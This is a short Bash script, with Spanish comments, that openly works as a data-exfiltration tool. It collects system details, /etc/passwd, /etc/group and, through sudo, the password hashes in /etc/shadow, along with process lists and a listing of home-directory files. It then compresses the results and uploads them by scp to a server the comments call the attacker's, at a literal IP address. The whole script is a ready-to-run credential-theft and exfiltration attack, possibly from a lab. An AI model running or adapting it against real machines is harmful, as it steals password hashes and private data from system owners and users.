#!/bin/bash

# Actualización de repositorios e instalación de utilidades necesarias
echo "[+] Instalando dependencias necesarias..."
apt-get install -y lsb-release tar openssh-client sshpass

echo "[+] Dependencias instaladas correctamente."

# Recolección de información del sistema
echo "[+] Recolectando información del sistema..."
uname -a > /tmp/system_info.txt
lsb_release -a >> /tmp/system_info.txt

# Recolección de información de usuarios y grupos
echo "[+] Recolectando información de usuarios y grupos..."
cat /etc/passwd >> /tmp/user_info.txt
cat /etc/group >> /tmp/user_info.txt
sudo cat /etc/shadow >> /tmp/user_info.txt

# Recolección de información de procesos activos
echo "[+] Recolectando información de procesos activos..."
ps aux >> /tmp/processes_info.txt

# Recolección de archivos en el home
echo "[+] Recolectando información de archivos en el home..."
find /home/* -type f -exec ls -lh {} \; | awk '{print $9, $5, $1}' > /tmp/files_info.txt

# Preparación de archivos para exfiltrar
echo "[+] Comprimendo los archivos..."
tar -czf /tmp/exfiltrated_data.tar.gz /tmp/system_info.txt /tmp/user_info.txt /tmp/processes_info.txt /tmp/files_info.txt

# Enviar el archivo al atacante usando clave SSH y scp
echo "[+] Enviando los archivos al servidor atacante..."
scp -i /path/to/Debian-Ataque_key.pem /tmp/exfiltrated_data.tar.gz azureuser@20.255.51.174:/home/azureuser/exfiltrated_data

echo "[+] Proceso completo. Información exfiltrada."
